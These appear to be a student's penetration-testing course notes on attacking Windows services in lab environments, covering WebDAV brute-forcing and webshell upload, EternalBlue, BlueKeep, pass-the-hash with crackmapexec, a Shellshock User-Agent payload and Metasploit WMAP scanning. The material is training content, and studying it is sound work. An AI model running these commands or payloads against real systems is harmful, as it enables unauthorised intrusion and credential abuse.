
1. Information Gathering
2. Enumeration
3. Exploitation
4. Post-Exploitation
5. Reporting


- Microsoft IIS - Ports 80/443
- WebDAV - 80/443
- SMB/CIFS - 445
- RDP - 3389
- WinRM - 5986/443

Which Metasploit plugin assists in identifying exploit modules based on currently open ports?b

<h2>WebDAV Exploitation</h2>

Standard port 80 with SSL encryption 443.

Step 1: identify if wedav is running on iis web server (.net and php)

If not this can be easy

Tools:

.davtest: use to authenticate and exploit the web server also send test files as upload.

.cadaver: authenticate with file upload (webshell) and download etc.

```
hydra -L pathtouser -P pathtopass ipORdomain http-get /subdirectory/
```

```
nmap --script http-enum -sV -p 80 demo.ine.local
```
--
```
 davtest -url http://demo.ine.local/

 davtest -auth username:password -url http://demo.ine.local/webdav

 cadaver http://demo.ine.local/webdav
```
- Can also use Metasploit. 
```
search IIS upload
```
<h2>SMB Exploitation (EternalBlue) - NSA</h2>

Standard port 445

Which tool is mentioned for automating the exploitation of the MS-17-010 vulnerability?

Autosmb ms17-010

```
Nmap --script smb-vuln-ms17-010
```
What is AutoBlue (MS17-010)?

- AutoBlue is a public proof-of-concept (PoC) exploit for the MS17-010 vulnerability (also known as EternalBlue).
- MS17-010 is a Microsoft Windows SMBv1 vulnerability that allows remote code execution (RCE) when exploited.
- Exploits like AutoBlue abuse the flaw to gain control of a vulnerable system over the network without authentication.

The exploit code does only one main job:

- It abuses the vulnerability to inject code execution capability into the target.
- But at this stage, the target system just has a "hole" that lets you run some arbitrary instructions — it doesn’t know what to run unless you give it payload code.

Think of it like:

- The exploit = breaking open a door and making a hole in the wall.
- The shellcode = instructions telling the system what to actually do once you’re inside.

<h2>RDP Exploitation(BlueKeep) - Microsoft Researchers </h2>

Standard port 3389

In the metasploite we have to also set target ;

- Show targets
- Set target 2(example)

<h2>Pass-the-Hash attack</h2>

Harvesting NTML passwords

Tools:

- Crackmapexec ( automates interactions for SMB authentication)
- Metasploit PsExec Module - ( uses both LM and NTLM)

 In the cybersecurity world, BadBlue is primarily known as a vulnerable target used in penetration testing and training exercises. A common lab exercise in cybersecurity education is to demonstrate how attackers can exploit the buffer overflow in BadBlue to gain remote access to a system.

```
 crackmapexec smb domain.ine.local -u Admin -H "NTML-hash"
 crackmapexec smb domain.ine.local -u Admin -H "NTML-hash" "ipconfig"
```
The PURPOSE of Pass-the-hash is to authenticate with the NTML hash or with clear text password.

<h2>ShellShock (remote arbitrary code execution in bash shell code)</h2>

- Vulnerability in bash
- Apache web server sometimes uses CGI ( common gateway interface)
- If the CGI is configured to use bash then .cgi files are also vulnerable.

```
nmap --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```


User-Agent:
```
() { :; }; echo; echo; /bin/bash -c 'ps -ef'
```
<h2>Nessus</h2>

You can load the results of Nessus into Metasploit and check the results using the following commands.

```
 hosts

 services

 vulns
```
<h2>WMAP</h2>

```
 load wmap

 wmap_sites -a targetIP

 wmap_targets -h

 wmap_targets -t [http://targetIP](http://targetIP)

 wmap_sites -l

 wmap_target -l

 wmap_target -t ( list the modules to be performed)

 wmap_run -h

 wmap_run -t
```
This will give you all the modules inside Metasploit that can be used to exploit against.

```
 auxiliary/scanner/http/http_put

 wmap_run -e
```
this will run all enabled modules against the target web server and will display the results of the modules.



